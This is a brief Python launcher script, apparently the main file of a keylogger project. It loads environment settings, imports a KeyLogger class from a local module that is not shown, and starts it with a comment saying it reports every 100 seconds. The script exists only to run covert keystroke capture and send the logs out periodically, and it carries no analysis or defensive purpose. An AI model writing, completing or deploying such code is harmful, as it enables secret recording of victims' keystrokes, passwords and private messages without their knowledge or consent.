#!/usr/bin/env python
from dotenv import load_dotenv
from KeyLogger import KeyLogger

load_dotenv()

if __name__ == '__main__':
    keylogger = KeyLogger(100) # Report every 100 seconds
    keylogger.start()